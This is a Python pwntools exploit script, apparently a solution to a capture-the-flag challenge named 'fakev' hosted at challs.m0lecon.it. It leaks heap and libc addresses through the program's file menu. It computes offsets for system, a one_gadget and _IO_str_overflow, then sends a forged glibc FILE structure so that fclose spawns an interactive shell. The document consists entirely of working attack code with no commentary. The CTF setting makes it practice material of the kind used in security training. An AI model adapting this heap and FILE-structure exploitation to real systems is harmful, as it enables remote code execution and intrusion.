from pwn import *
from pwn import log as Log

def log(title,value):
    Log.info(title + ": {} ".format(hex(value)))


#p = process("./fakev")
p = remote("challs.m0lecon.it",9013)
p.recv(8000)


def open_file(index):
    p.sendline("1")
    p.recv(8000)
    p.sendline(str(index))
    p.recv(8000)

def open_file_str(index):
    p.sendline("1")
    p.recv(8000)
    p.sendline(index)
    p.recv(8000)

def read_content(index):
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(index))
    cont = p.recvuntil("<=")[:-2]
    p.recv(8000)
    return cont

def close_file():
    p.sendline("4")
    p.recv(8000)

for i in range(1,9):
    open_file(i)
for i in range(8):
    close_file()


data=read_content(1)
heap=u64(data[:8])+0x10
leak=u64(data[8:16])
base=leak-0x3ebca0
system=base+0x000000000004f440
one_gadget=base+0x4f322
_IO_str_overflow=base+0x3e8378
binsh=base+0x1b3e9a
log("leak",leak)
log("heap",heap)
log("base",base)
log("system",system)
log("/bin/sh",binsh)
log("_IO_str_overflow",_IO_str_overflow)
for i in range(1,9):
    open_file(1)
open_file_str("1"+"D"*254)

#_IO_new_fclose+212
fake_HEAD=0x602110

payload=""
payload+="4"+"\x00"*7
payload+=p64(0)
payload+=p64(0xfbad2400)
payload+=p64(heap)*8
payload+=p64(0)*5
payload+=p64(0x6020f0)*4
payload+=p64(0xffffffffffffffff)
payload+=p64(fake_HEAD)+p64(0)
payload+=p64(0)*6
payload+=p64(_IO_str_overflow-136)
payload+=p64(one_gadget)

#gdb.attach(p.pid)
#pause()
p.sendline(payload)


p.interactive()